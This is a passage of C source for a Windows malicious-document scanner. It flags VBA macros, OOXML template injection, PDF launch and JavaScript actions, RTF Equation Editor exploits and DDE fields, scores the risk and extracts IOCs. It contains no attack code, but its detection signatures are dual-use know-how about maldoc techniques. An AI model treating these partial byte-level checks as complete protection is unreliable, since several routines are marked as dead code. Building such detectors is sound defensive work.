            while (j < len && (expanded[j] == '\r' || expanded[j] == '\n')) j++;
            if (j > i + 2) { i = j - 1; continue; }
        }
        Out[di++] = expanded[i];
    }
    Out[di] = '\0';

    free(expanded);
}

/**************************************************/
/*               OOXML 宏提取                       */
/*  对齐 SS ExtractOOXMLMacros L1889-1980          */
/**************************************************/

static void
WkdDocExtractOoxmlMacros(
    _In_ PCWSTR                  FilePath,
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    static const WCHAR* vbaPaths[] = {
        L"word/vbaProject.bin",
        L"xl/vbaProject.bin",
        L"ppt/vbaProject.bin",
        L"vbaProject.bin",
    };
    ULONG p;
    const ULONG bufCap = WKD_DOC_MAX_JAVASCRIPT; /* 10MB */
    BYTE* buf = NULL;

    buf = (BYTE*)malloc(bufCap);
    if (!buf) return;

    for (p = 0; p < (ULONG)(sizeof(vbaPaths) / sizeof(vbaPaths[0])); p++) {
        ULONG outLen = 0;
        NTSTATUS status = WkdArc_ExtractEntry(FilePath, vbaPaths[p], buf, bufCap, &outLen);
        if (!NT_SUCCESS(status) || outLen == 0) continue;

        /* 从 vbaProject.bin (OLE) 提取宏模块 */
        if (WkdDocExtractMacrosFromBuffer(buf, outLen, R) > 0) {
            free(buf);
            return;
        }

        /* 有 VBA 项目但无 Attribute 指令 → 二进制占位 (对齐 SS L1959-1966) */
        if (R->MacroCount == 0) {
            PWKD_DOC_MACRO macro = &R->Macros[0];
            memset(macro, 0, sizeof(*macro));
            strcpy_s(macro->ModuleName, sizeof(macro->ModuleName), "vbaProject");
            strcpy_s(macro->ModuleType, sizeof(macro->ModuleType), "Binary");
            sprintf_s(macro->SourceCode, sizeof(macro->SourceCode),
                      "[Binary VBA project detected, size: %u bytes]", outLen);
            macro->LineCount = 1;
            R->MacroCount = 1;
            R->HasMacros = TRUE;
            WkdDocAddThreat(R, WkdDocThreat_VBAMacro, 50,
                            "OOXML binary VBA project", "OOXML", "T1059.005", NULL);
            free(buf);
            return;
        }
        free(buf);
        return;
    }

    free(buf);
}

/**************************************************/
/*               OOXML 模板注入                    */
/*  对齐 SS CheckTemplateInjection L2541-2606      */
/*  (死代码: 无 XML 解析, 字节级 rels 特征扫描)    */
/**************************************************/

static void
WkdDocCheckTemplateInjection(
    _In_ PCWSTR                  FilePath,
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    static const WCHAR* relsPaths[] = {
        L"word/_rels/settings.xml.rels",
        L"word/_rels/document.xml.rels",
        L"xl/_rels/workbook.xml.rels",
        L"ppt/_rels/presentation.xml.rels",
    };
    ULONG p;
    const ULONG bufCap = 1024 * 1024;
    BYTE* buf = NULL;

    if (R->HasTemplateInjection) return;
    buf = (BYTE*)malloc(bufCap);
    if (!buf) return;

    for (p = 0; p < (ULONG)(sizeof(relsPaths) / sizeof(relsPaths[0])); p++) {
        ULONG outLen = 0;
        NTSTATUS status = WkdArc_ExtractEntry(FilePath, relsPaths[p], buf, bufCap, &outLen);
        if (!NT_SUCCESS(status) || outLen == 0) continue;

        /* 字节级特征: External 目标 + 模板/对象类型 (对齐 SS pugixml 判定) */
        if (WkdDocFindStrNoCase(buf, outLen, "TargetMode=\"External\"") &&
            (WkdDocFindStrNoCase(buf, outLen, "attachedTemplate") ||
             WkdDocFindStrNoCase(buf, outLen, "oleObject") ||
             WkdDocFindStrNoCase(buf, outLen, "frame"))) {
            R->HasTemplateInjection = TRUE;
            WkdDocAddThreat(R, WkdDocThreat_TemplateInjection, 85,
                            "External template injection detected", "OOXML", "T1221", NULL);
            break;
        }
    }

    free(buf);
}

/**************************************************/
/*               OOXML 外部链接                    */
/*  对齐 SS CheckExternalLinks L2608-2672          */
/*  (死代码: 字节级 rels 特征扫描)                 */
/**************************************************/

static void
WkdDocCheckExternalLinks(
    _In_ PCWSTR                  FilePath,
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    static const WCHAR* relsPaths[] = {
        L"_rels/.rels",
        L"word/_rels/document.xml.rels",
        L"word/_rels/header1.xml.rels",
        L"word/_rels/footer1.xml.rels",
        L"xl/_rels/workbook.xml.rels",
        L"xl/worksheets/_rels/sheet1.xml.rels",
        L"ppt/_rels/presentation.xml.rels",
        L"ppt/slides/_rels/slide1.xml.rels",
    };
    ULONG p;
    const ULONG bufCap = 1024 * 1024;
    BYTE* buf = NULL;

    if (R->HasExternalLinks) return;
    buf = (BYTE*)malloc(bufCap);
    if (!buf) return;

    for (p = 0; p < (ULONG)(sizeof(relsPaths) / sizeof(relsPaths[0])); p++) {
        ULONG outLen = 0;
        NTSTATUS status = WkdArc_ExtractEntry(FilePath, relsPaths[p], buf, bufCap, &outLen);
        if (!NT_SUCCESS(status) || outLen == 0) continue;

        if (WkdDocFindStrNoCase(buf, outLen, "TargetMode=\"External\"") &&
            (WkdDocFindStrNoCase(buf, outLen, "http://") ||
             WkdDocFindStrNoCase(buf, outLen, "https://") ||
             WkdDocFindStrNoCase(buf, outLen, "ftp://") ||
             WkdDocFindStrNoCase(buf, outLen, "\\\\"))) {
            R->HasExternalLinks = TRUE;
            WkdDocAddThreat(R, WkdDocThreat_ExternalLink, 40,
                            "External link in document", "OOXML", "T1071.001", NULL);
            break;
        }
    }

    free(buf);
}

/**************************************************/
/*               PDF 对象级扫描                     */
/*  对齐 SS AnalyzePDF L1133-1244                  */
/**************************************************/

static void
WkdDocExtractPdfJavaScriptFromObject(
    _In_ const BYTE* ObjContent,
    _In_ ULONG       ObjLen,
    _Inout_ PWKD_DOC_PDF_OBJECT Obj
    )
{
    const BYTE* jsStart;
    ULONG sPos;

    jsStart = WkdDocFindStrNoCase(ObjContent, ObjLen, "/JS");
    if (!jsStart) jsStart = WkdDocFindStrNoCase(ObjContent, ObjLen, "/JavaScript");
    if (!jsStart) return;

    sPos = (ULONG)(jsStart - ObjContent);
    {
        const BYTE* streamStart = WkdDocFindStrNoCase(ObjContent + sPos, ObjLen - sPos, "stream");
        ULONG ss;
        ULONG se;
        ULONG len;
        if (streamStart) {
            ss = (ULONG)(streamStart - ObjContent) + 6;
            se = ss;
            {
                const BYTE* es = WkdDocFindStrNoCase(ObjContent + ss, ObjLen - ss, "endstream");
                if (es) se = (ULONG)(es - ObjContent);
                else se = ObjLen;
            }
            len = se - ss;
            if (len > WKD_DOC_MAX_JAVASCRIPT) len = WKD_DOC_MAX_JAVASCRIPT;
            if (len >= sizeof(Obj->JsSnippet)) len = sizeof(Obj->JsSnippet) - 1;
            memcpy(Obj->JsSnippet, &ObjContent[ss], len);
            Obj->JsSnippet[len] = '\0';
        }
    }
}

static void
WkdDocAnalyzePdf(
    _In_ const BYTE* Buf,
    _In_ ULONG       Size,
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    ULONG pos = 0;
    ULONG objCount = 0;

    /* 对象定位: "\d+ \d+ obj ... endobj" (对齐 SS L1157-1236) */
    while (pos < Size && objCount < WKD_DOC_MAX_PDF_OBJECTS) {
        ULONG numStart = Size; /* 哨兵 */
        ULONG i;

        for (i = pos; i + 5 < Size; i++) {
            ULONG j;
            if (Buf[i] < '0' || Buf[i] > '9') continue;
            /* 第一个数字 */
            j = i;
            while (j < Size && Buf[j] >= '0' && Buf[j] <= '9') j++;
            if (j >= Size || Buf[j] != ' ') { pos = j; continue; }
            j++;
            if (j >= Size || Buf[j] < '0' || Buf[j] > '9') { pos = j; continue; }
            while (j < Size && Buf[j] >= '0' && Buf[j] <= '9') j++;
            if (j + 4 <= Size && Buf[j] == ' ' && Buf[j+1] == 'o' && Buf[j+2] == 'b' && Buf[j+3] == 'j') {
                numStart = i;
                pos = j + 4;
                break;
            }
            pos = j;
        }

        if (numStart >= Size) break;

        /* 对象数组满则停止记录 (WKD_DOC_MAX_PDFOBJ=16 槽) */
        if (R->PdfObjectCount >= WKD_DOC_MAX_PDFOBJ) break;

        /* 找 endobj */
        {
            const BYTE* endObj = WkdDocFindStrNoCase(Buf + pos, Size - pos, "endobj");
            ULONG objEnd;
            ULONG objLen;
            ULONG k;
            PWKD_DOC_PDF_OBJECT obj;
            BOOLEAN any = FALSE;

            if (!endObj) break;
            objEnd = (ULONG)(endObj - Buf);
            objLen = (objEnd - pos < WKD_DOC_PDF_OBJECT_CAP) ? (objEnd - pos) : WKD_DOC_PDF_OBJECT_CAP;

            obj = &R->PdfObjects[R->PdfObjectCount];
            memset(obj, 0, sizeof(*obj));
            obj->ObjectId = 0;
            for (k = numStart; k < Size && Buf[k] >= '0' && Buf[k] <= '9'; k++) {
                obj->ObjectId = obj->ObjectId * 10 + (Buf[k] - '0');
            }

            if (WkdDocFindStrNoCase(Buf + pos, objLen, "/JavaScript") ||
                WkdDocFindStrNoCase(Buf + pos, objLen, "/JS")) {
                obj->HasJavaScript = TRUE;
                R->HasPdfJavaScript = TRUE;
                strcpy_s(obj->ObjectType, sizeof(obj->ObjectType), "JavaScript");
                WkdDocExtractPdfJavaScriptFromObject(Buf + pos, objLen, obj);
                any = TRUE;
            }

            for (k = 0; k < (ULONG)(sizeof(g_MaliciousPdfActions) / sizeof(g_MaliciousPdfActions[0])); k++) {
                if (WkdDocFindStrNoCase(Buf + pos, objLen, g_MaliciousPdfActions[k])) {
                    obj->HasAction = TRUE;
                    R->HasPdfActions = TRUE;
                    strncpy_s(obj->ActionType, sizeof(obj->ActionType), g_MaliciousPdfActions[k], _TRUNCATE);
                    any = TRUE;
                    break;
                }
            }

            if (WkdDocFindStrNoCase(Buf + pos, objLen, "/EmbeddedFile")) {
                obj->HasEmbeddedFile = TRUE;
                any = TRUE;
            }

            if (any) {
                R->PdfObjectCount++;
            }

            pos = objEnd + 6;
        }
        objCount++;
    }
}

/* PDF 全文快扫 (兜底, 对齐 SS AnalyzePDFBuffer L1731-1769) */
static void
WkdDocScanPdfBuffer(
    _In_  const BYTE* Buf,
    _In_  SIZE_T      Len,
    _Out_ PWKD_DOC_SCAN_RESULT R
    )
{
    ULONG i;
    BOOLEAN hasJs = FALSE;

    for (i = 0; i < (ULONG)(sizeof(g_MaliciousPdfActions) / sizeof(g_MaliciousPdfActions[0])); i++) {
        const BYTE* hit = WkdDocFindStrNoCase(Buf, Len, g_MaliciousPdfActions[i]);
        if (!hit) continue;
        R->HasPdfActions = TRUE;

        if (strstr(g_MaliciousPdfActions[i], "Launch")) {
            WkdDocAddThreat(R, WkdDocThreat_PDFLaunchAction, 85,
                            "PDF launch action", "PDF", "T1204.002", g_MaliciousPdfActions[i]);
        } else if (strstr(g_MaliciousPdfActions[i], "SubmitForm")) {
            WkdDocAddThreat(R, WkdDocThreat_PDFSubmitForm, 75,
                            "PDF submit-form action", "PDF", "T1566.001", g_MaliciousPdfActions[i]);
        } else if (strstr(g_MaliciousPdfActions[i], "/URI") || strstr(g_MaliciousPdfActions[i], "/GoToR")) {
            WkdDocAddThreat(R, WkdDocThreat_PDFOpenAction, 70,
                            "PDF open/URI action", "PDF", "T1204.002", g_MaliciousPdfActions[i]);
        } else {
            WkdDocAddThreat(R, WkdDocThreat_PDFJavaScript, 75,
                            "PDF JavaScript/action", "PDF", "T1059.007", g_MaliciousPdfActions[i]);
        }
    }

    if (WkdDocFindStrNoCase(Buf, Len, "/js") ||
        WkdDocFindStrNoCase(Buf, Len, "app.alert") ||
        WkdDocFindStrNoCase(Buf, Len, "util.printd")) {
        hasJs = TRUE;
    }
    if (hasJs) {
        R->HasPdfJavaScript = TRUE;
        if (R->ThreatCount == 0 || !R->HasPdfActions) {
            WkdDocAddThreat(R, WkdDocThreat_PDFJavaScript, 60,
                            "PDF embedded JavaScript indicators", "PDF", "T1059.007", NULL);
        }
    }
}

/**************************************************/
/*               RTF 内容扫描                       */
/*  对齐 SS AnalyzeRTFDocument L1664-1729          */
/**************************************************/

static void
WkdDocScanRtf(
    _In_  const BYTE* Buf,
    _In_  SIZE_T      Len,
    _Out_ PWKD_DOC_SCAN_RESULT R
    )
{
    if (WkdDocFindStrNoCase(Buf, Len, "\\objdata")) {
        R->HasOLEObjects = TRUE;
        WkdDocAddThreat(R, WkdDocThreat_RTFOLEObject, 65,
                        "RTF embedded OLE object", "RTF", "T1221", "objdata");
    }
    if (WkdDocFindStrNoCase(Buf, Len, "\\objupdate")) {
        WkdDocAddThreat(R, WkdDocThreat_RTFOLEObject, 70,
                        "RTF objupdate (CVE-2015-1641)", "RTF", "T1203", "objupdate");
    }
    if (WkdDocFindStrNoCase(Buf, Len, "Equation.3") ||
        WkdDocFindStrNoCase(Buf, Len, "equation native")) {
        WkdDocAddThreat(R, WkdDocThreat_RTFEquationEditor, 85,
                        "Equation Editor object (CVE-2017-11882)", "RTF", "T1203", "Equation.3");
    }
}

/**************************************************/
/*               DDE 检测                          */
/*  对齐 SS CheckForDDE L2498-2539 (前 16MB)       */
/**************************************************/

static void
WkdDocCheckDde(
    _In_  const BYTE* Buf,
    _In_  SIZE_T      Len,
    _Out_ PWKD_DOC_SCAN_RESULT R
    )
{
    SIZE_T scanLen = (Len < WKD_DOC_DDE_SCAN_CAP) ? Len : WKD_DOC_DDE_SCAN_CAP;

    if (WkdDocFindStrNoCase(Buf, scanLen, "DDE") ||
        WkdDocFindStrNoCase(Buf, scanLen, "DDEAUTO")) {
        R->HasDdeLinks = TRUE;
        WkdDocAddThreat(R, WkdDocThreat_DDELink, 75,
                        "Document contains DDE links", "document", "T1559.002", NULL);
    }
}

/**************************************************/
/*               CVE 模式匹配                       */
/**************************************************/

static void
WkdDocScanCve(
    _In_  const BYTE* Buf,
    _In_  SIZE_T      Len,
    _Out_ PWKD_DOC_SCAN_RESULT R
    )
{
    ULONG i;

    for (i = 0; i < (ULONG)(sizeof(g_CvePatterns) / sizeof(g_CvePatterns[0])); i++) {
        if (WkdDocFindStrNoCase(Buf, Len, g_CvePatterns[i][0])) {
            WkdDocAddThreat(R, WkdDocThreat_CVEExploit, 90,
                            g_CvePatterns[i][2], "document", "T1203", g_CvePatterns[i][0]);
        }
    }
}

/**************************************************/
/*               元数据提取                        */
/*  对齐 SS ExtractMetadata L2674-2761 (死代码)    */
/**************************************************/

static void
WkdDocExtractMetadata(
    _In_ PCWSTR                  FilePath,
    _In_ WKD_DOC_TYPE            DocType,
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    /* OOXML: docProps/core.xml creator/title/subject (字节级) */
    if (DocType == WkdDocType_DOCX || DocType == WkdDocType_DOCM ||
        DocType == WkdDocType_DOTM || DocType == WkdDocType_XLSX ||
        DocType == WkdDocType_XLSM || DocType == WkdDocType_PPTX ||
        DocType == WkdDocType_PPTM) {
        BYTE buf[1024 * 1024];
        ULONG outLen = 0;
        if (NT_SUCCESS(WkdArc_ExtractEntry(FilePath, L"docProps/core.xml", buf,
                                           sizeof(buf), &outLen)) && outLen > 0) {
            const BYTE* hit;
            if ((hit = WkdDocFindStrNoCase(buf, outLen, "<dc:creator>")) != NULL) {
                ULONG s = (ULONG)(hit - buf) + (ULONG)strlen("<dc:creator>");
                ULONG e = s;
                while (e < outLen && e - s < sizeof(R->Author) - 1 && buf[e] != '<') e++;
                if (e > s) { memcpy(R->Author, &buf[s], e - s); R->Author[e - s] = '\0'; }
            }
            if ((hit = WkdDocFindStrNoCase(buf, outLen, "<dc:title>")) != NULL) {
                ULONG s = (ULONG)(hit - buf) + (ULONG)strlen("<dc:title>");
                ULONG e = s;
                while (e < outLen && e - s < sizeof(R->Title) - 1 && buf[e] != '<') e++;
                if (e > s) { memcpy(R->Title, &buf[s], e - s); R->Title[e - s] = '\0'; }
            }
            if ((hit = WkdDocFindStrNoCase(buf, outLen, "<dc:subject>")) != NULL) {
                ULONG s = (ULONG)(hit - buf) + (ULONG)strlen("<dc:subject>");
                ULONG e = s;
                while (e < outLen && e - s < sizeof(R->Subject) - 1 && buf[e] != '<') e++;
                if (e > s) { memcpy(R->Subject, &buf[s], e - s); R->Subject[e - s] = '\0'; }
            }
        }
        return;
    }

    /* PDF: 前 64KB /Info 字典 /Author /Title /Subject */
    if (DocType == WkdDocType_PDF) {
        BYTE buf[65536];
        DWORD rd = 0;
        HANDLE h = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE,
                               NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
        if (h != INVALID_HANDLE_VALUE) {
if (ReadFile(h, buf, sizeof(buf), &rd, NULL) && rd > 0) {
                /* 不能 const 初始化含 sizeof(R->*) 的聚合 (R 非常量),
                 * 改为自动数组逐项填充。 */
                const struct { PCSTR Tag; ULONG DstSize; } fields[] = {
                    { "/Author", sizeof(R->Author) },
                    { "/Title",  sizeof(R->Title)  },
                    { "/Subject",sizeof(R->Subject) },
                };
                LPSTR dsts[] = { R->Author, R->Title, R->Subject };
                ULONG f;
                for (f = 0; f < 3; f++) {
                    const BYTE* hit = WkdDocFindStrNoCase(buf, rd, fields[f].Tag);
                    const BYTE* open;
                    ULONG s, e;

                    if (!hit) continue;
                    s = (ULONG)(hit - buf);
                    e = s;
                    while (e < rd && buf[e] != '\n' && buf[e] != '\r' &&
                           buf[e] != '>' && buf[e] != ')') e++;
                    if (e > s) {
                        /* 跳过前导空白 */
                        while (s < e && (buf[s] == ' ' || buf[s] == '\t')) s++;
                        ULONG n = (e - s < fields[f].DstSize - 1) ? (e - s)
                                                                   : (fields[f].DstSize - 1);
                        memcpy(dsts[f], &buf[s], n);
                        dsts[f][n] = '\0';
                    }
                }
            }
            CloseHandle(h);
        }
    }
}

/**************************************************/
/*               评分判定                          */
/*  对齐 SS CalculateVerdict L2939-3040            */
/**************************************************/

static void
WkdDocCalculateVerdict(
    _Inout_ PWKD_DOC_SCAN_RESULT R
    )
{
    ULONG totalRisk = 0;

    totalRisk += R->CriticalThreats * 30;
    totalRisk += R->HighThreats * 20;
    totalRisk += R->MediumThreats * 10;

    /* 宏风险 (对齐 SS L2948-2951) */
    if (R->HighestMacroRisk == 4) totalRisk += 40;
    else if (R->HighestMacroRisk == 3) totalRisk += 30;
    else if (R->HighestMacroRisk == 2) totalRisk += 15;

    /* AI 融合 / PatternStore YARA → 依赖缺失 (死代码, ScanManager 流水线覆盖) */

    R->RiskScore = (totalRisk > 100) ? 100 : totalRisk;

    if (R->CriticalThreats > 0 || R->RiskScore >= 80) {
        R->Verdict = 3;
        strcpy_s(R->VerdictReason, sizeof(R->VerdictReason), "Critical document threats");
    } else if (R->HighThreats > 0 || R->RiskScore >= 60) {
        R->Verdict = 2;
        strcpy_s(R->VerdictReason, sizeof(R->VerdictReason), "High-risk document threats");
    } else if (R->MediumThreats > 0 || R->RiskScore >= 30) {
        R->Verdict = 1;
        strcpy_s(R->VerdictReason, sizeof(R->VerdictReason), "Suspicious document patterns");
    } else {
        R->Verdict = 0;
        strcpy_s(R->VerdictReason, sizeof(R->VerdictReason), "No document threats");
    }
}

/* IOC 去重 (对齐 SS ExtractAllIOCs L2773-2781 排序去重, 双重循环保序) */
#define WKD_DEDUPE_FN(name, ROW) \
static void name(_Inout_ CHAR (*Arr)[ROW], _Inout_ PULONG Count) \
{ ULONG i, j, w = 0; \
  for (i = 0; i < *Count; i++) { BOOLEAN dup = FALSE; \
    for (j = 0; j < w; j++) if (strcmp(Arr[j], Arr[i]) == 0) { dup = TRUE; break; } \
    if (!dup) { if (w != i) strcpy_s(Arr[w], ROW, Arr[i]); w++; } } \
  *Count = w; }

WKD_DEDUPE_FN(WkdDocDedupeUrls, 256)
WKD_DEDUPE_FN(WkdDocDedupeIps, 64)
WKD_DEDUPE_FN(WkdDocDedupeEmails, 128)

/**************************************************/
/*               文档类型检测                       */
/*  对齐 SS DetectDocumentType L1351-1414          */
/**************************************************/

static WKD_DOC_TYPE
IocDocument_ContainerOf(
    _In_ WKD_DOC_TYPE T
    )
{
    switch (T) {
    case WkdDocType_PDF: return WkdDocType_PDF;
    case WkdDocType_OLE:
    case WkdDocType_DOC:
    case WkdDocType_XLS:
    case WkdDocType_PPT:
    case WkdDocType_MSG:
    case WkdDocType_DOT:
    case WkdDocType_XLT:
        return WkdDocType_OLE;
    case WkdDocType_OOXML:
    case WkdDocType_DOCX:
    case WkdDocType_DOCM:
    case WkdDocType_DOTM:
    case WkdDocType_XLSX:
    case WkdDocType_XLSM:
    case WkdDocType_XLSB:
    case WkdDocType_PPTX:
    case WkdDocType_PPTM:
    case WkdDocType_ODF:
        return WkdDocType_OOXML;
    case WkdDocType_RTF: return WkdDocType_RTF;
    default: return WkdDocType_Unknown;
    }
}

NTSTATUS
IocDocument_DetectType(
    _In_ PCWSTR         FilePath,
    _Out_ PWKD_DOC_TYPE Type
    )
{
    HANDLE h;
    BYTE head[16];
    DWORD rd = 0;
    BOOLEAN ok;
    PCWSTR dot = NULL;
    WKD_DOC_TYPE base;

    if (!FilePath || !Type) return STATUS_INVALID_PARAMETER;
    *Type = WkdDocType_Unknown;

    h = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (h == INVALID_HANDLE_VALUE) return STATUS_NOT_FOUND;

    ok = ReadFile(h, head, sizeof(head), &rd, NULL);
    CloseHandle(h);
    if (!ok || rd < 4) return STATUS_SUCCESS;

    if (FilePath) dot = wcsrchr(FilePath, L'.');

    if (rd >= 5 && memcmp(head, "%PDF-", 5) == 0) {
        *Type = WkdDocType_PDF;
    } else if (rd >= 8 && memcmp(head, "\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1", 8) == 0) {
        /* OLE 复合文档: 按扩展名细化 (对齐 SS L1363-1373) */
        if (dot) {
            if (_wcsicmp(dot, L".xls") == 0) *Type = WkdDocType_XLS;
            else if (_wcsicmp(dot, L".ppt") == 0) *Type = WkdDocType_PPT;
            else if (_wcsicmp(dot, L".msg") == 0) *Type = WkdDocType_MSG;
            else if (_wcsicmp(dot, L".dot") == 0) *Type = WkdDocType_DOT;
            else if (_wcsicmp(dot, L".xlt") == 0) *Type = WkdDocType_XLT;
            else *Type = WkdDocType_DOC;
        } else {
            *Type = WkdDocType_OLE;
        }
    } else if (rd >= 4 && memcmp(head, "PK\x03\x04", 4) == 0) {
        /* OOXML zip 容器: 按扩展名细化 (对齐 SS L1375-1384) */
        if (dot) {
            if (_wcsicmp(dot, L".docm") == 0) *Type = WkdDocType_DOCM;
            else if (_wcsicmp(dot, L".dotm") == 0) *Type = WkdDocType_DOTM;
            else if (_wcsicmp(dot, L".xlsx") == 0) *Type = WkdDocType_XLSX;
            else if (_wcsicmp(dot, L".xlsm") == 0) *Type = WkdDocType_XLSM;
            else if (_wcsicmp(dot, L".xlsb") == 0) *Type = WkdDocType_XLSB;
            else if (_wcsicmp(dot, L".pptx") == 0) *Type = WkdDocType_PPTX;
            else if (_wcsicmp(dot, L".pptm") == 0) *Type = WkdDocType_PPTM;
            else if (_wcsicmp(dot, L".odt") == 0 || _wcsicmp(dot, L".ods") == 0 ||
                     _wcsicmp(dot, L".odp") == 0) *Type = WkdDocType_ODF;
            else *Type = WkdDocType_DOCX;
        } else {
            *Type = WkdDocType_OOXML;
        }
    } else if (rd >= 5 && memcmp(head, "{\\rtf", 5) == 0) {
        *Type = WkdDocType_RTF;
    }

    base = IocDocument_ContainerOf(*Type);
    if (base == WkdDocType_Unknown && *Type != WkdDocType_Unknown) {
        /* EML/ONE 等魔数不可判 → 保持原类型, 分析器不支持时置 Unknown */
    }

    return STATUS_SUCCESS;
}

/**************************************************/
/*               主入口                            */
/**************************************************/

NTSTATUS
IocDocument_ScanFile(
    _In_ PCWSTR             FilePath,
    _Out_ PWKD_DOC_SCAN_RESULT Result
    )
{
    HANDLE h;
    LARGE_INTEGER size;
    BYTE* buf = NULL;
    SIZE_T readLen = 0;
    WKD_DOC_TYPE type;
    WKD_DOC_TYPE base;
    NTSTATUS status = STATUS_SUCCESS;
    DWORD rd = 0;

    if (!FilePath || !Result) return STATUS_INVALID_PARAMETER;
    RtlZeroMemory(Result, sizeof(*Result));

    status = IocDocument_DetectType(FilePath, &type);
    if (!NT_SUCCESS(status)) return status;
    Result->DocumentType = type;
    base = IocDocument_ContainerOf(type);
    if (base == WkdDocType_Unknown) return STATUS_SUCCESS;

    /* 整读文件 (PDF/RTF/OLE 分析需要全文 buffer) */
    h = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (h == INVALID_HANDLE_VALUE) return STATUS_NOT_FOUND;

    GetFileSizeEx(h, &size);
    if (size.QuadPart <= 0 || size.QuadPart > WKD_DOC_MAX_FILE_SIZE) {
        CloseHandle(h);
        return STATUS_SUCCESS;
    }
    readLen = (SIZE_T)size.QuadPart;
    buf = (BYTE*)malloc(readLen);
    if (!buf) { CloseHandle(h); return STATUS_NO_MEMORY; }

    if (!ReadFile(h, buf, (DWORD)readLen, &rd, NULL)) {
        free(buf); CloseHandle(h);
        return STATUS_UNSUCCESSFUL;
    }
    CloseHandle(h);
    if (rd < readLen) readLen = rd;
    Result->FileSize = readLen;

    /* 类型分派 */
    switch (base) {
    case WkdDocType_PDF:
        WkdDocAnalyzePdf(buf, (ULONG)readLen, Result);
        WkdDocScanPdfBuffer(buf, readLen, Result);
        WkdDocScanCve(buf, readLen, Result);
        WkdDocCheckDde(buf, readLen, Result);
        break;

    case WkdDocType_RTF:
        WkdDocScanRtf(buf, readLen, Result);
        WkdDocScanCve(buf, readLen, Result);
        WkdDocCheckDde(buf, readLen, Result);
        break;

    case WkdDocType_OLE:
        WkdDocExtractOleObjects(buf, (ULONG)readLen, Result);
        /* legacy OLE 宏源码提取 (对齐 SS ExtractOLEMacros L1795-1887) */
        WkdDocExtractMacrosFromBuffer(buf, (ULONG)readLen, Result);
        WkdDocScanOle(buf, readLen, Result);
        WkdDocScanCve(buf, readLen, Result);
        WkdDocCheckDde(buf, readLen, Result);
        break;

    case WkdDocType_OOXML:
        /* OOXML 压缩内容不可见 → 按路径提取分析 */
        WkdDocExtractOoxmlMacros(FilePath, Result);
        WkdDocCheckTemplateInjection(FilePath, Result);
        WkdDocCheckExternalLinks(FilePath, Result);
        WkdDocCheckDde(buf, readLen, Result);
        break;

    default:
        break;
    }

    /* 通用 IOC 提取 */
    if (readLen <= WKD_DOC_MAX_STRING_EXTRACT || readLen > 0) {
        SIZE_T scanLen = (readLen < WKD_DOC_MAX_STRING_EXTRACT) ? readLen : WKD_DOC_MAX_STRING_EXTRACT;
        CHAR urls[WKD_DOC_MAX_IOC][256];
        CHAR ips[WKD_DOC_MAX_IOC][64];
        CHAR emails[WKD_DOC_MAX_EMAIL][128];
        ULONG urlCount = 0, ipCount = 0, emailCount = 0;
        ULONG c;

        WkdDocExtractUrls(buf, scanLen, WKD_DOC_MAX_IOC, urls, &urlCount);
        WkdDocExtractIps(buf, scanLen, WKD_DOC_MAX_IOC, ips, &ipCount);
        WkdDocExtractEmails(buf, scanLen, WKD_DOC_MAX_EMAIL, emails, &emailCount);

        for (c = 0; c < urlCount && Result->UrlCount < WKD_DOC_MAX_IOC; c++) {
            strncpy_s(Result->Urls[Result->UrlCount], 256, urls[c], _TRUNCATE);
            Result->UrlCount++;
        }
        for (c = 0; c < ipCount && Result->IpCount < WKD_DOC_MAX_IOC; c++) {
            strncpy_s(Result->Ips[Result->IpCount], 64, ips[c], _TRUNCATE);
            Result->IpCount++;
        }
        for (c = 0; c < emailCount && Result->EmailCount < WKD_DOC_MAX_EMAIL; c++) {
            strncpy_s(Result->Emails[Result->EmailCount], 128, emails[c], _TRUNCATE);
            Result->EmailCount++;
        }

        /* IOC 去重 (对齐 SS ExtractAllIOCs) */
        WkdDocDedupeUrls(Result->Urls, &Result->UrlCount);
        WkdDocDedupeIps(Result->Ips, &Result->IpCount);
        WkdDocDedupeEmails(Result->Emails, &Result->EmailCount);
    }

    /* 高熵检测 (对齐 SS CalculateVerdict 分段熵) */
    if (readLen > 64 * 1024) {
        double ent = WkdDocEntropy(buf, readLen);
        if (ent > 7.2) {
            WkdDocAddThreat(Result, WkdDocThreat_HighEntropy, 35,
                            "Document high entropy (packed/encrypted)", "whole", NULL, NULL);
        }
    }

    /* 元数据 (死代码) */
    WkdDocExtractMetadata(FilePath, type, Result);

    /* 评分判定 */
    WkdDocCalculateVerdict(Result);

    free(buf);
    return STATUS_SUCCESS;
}

/**************************************************/
/*               IOC 结果映射                      */
/*  对齐 SS ScanVerdict → wkd DefIocVerdict        */
/*  (死代码: 接线 ScanManager.ScanFileDirect)      */
/**************************************************/

NTSTATUS
IocDocument_ResultToIocScan(
    _In_ PWKD_DOC_SCAN_RESULT Doc,
    _Inout_ PIOC_SCAN_RESULT  Ioc
    )
{
    if (!Doc || !Ioc) return STATUS_INVALID_PARAMETER;

    switch (Doc->Verdict) {
    case 0:
        Ioc->FinalVerdict = DefIocVerdict_Clean;
        break;
    case 1:
        Ioc->FinalVerdict = DefIocVerdict_Suspicious;
        break;
    default:
        Ioc->FinalVerdict = DefIocVerdict_Malicious;
        break;
    }
    Ioc->FinalConfidence = Doc->RiskScore;

    if (Doc->HasMacros || Doc->MacroCount > 0) {
        strncpy_s(Ioc->ThreatName, sizeof(Ioc->ThreatName), "Doc.Macro", _TRUNCATE);
    } else if (Doc->HasOLEObjects) {
        strncpy_s(Ioc->ThreatName, sizeof(Ioc->ThreatName), "Doc.OLE", _TRUNCATE);
    } else if (Doc->HasPdfJavaScript || Doc->HasPdfActions) {
        strncpy_s(Ioc->ThreatName, sizeof(Ioc->ThreatName), "Doc.PDF", _TRUNCATE);
    } else if (Doc->HasDdeLinks || Doc->HasTemplateInjection) {
        strncpy_s(Ioc->ThreatName, sizeof(Ioc->ThreatName), "Doc.Link", _TRUNCATE);
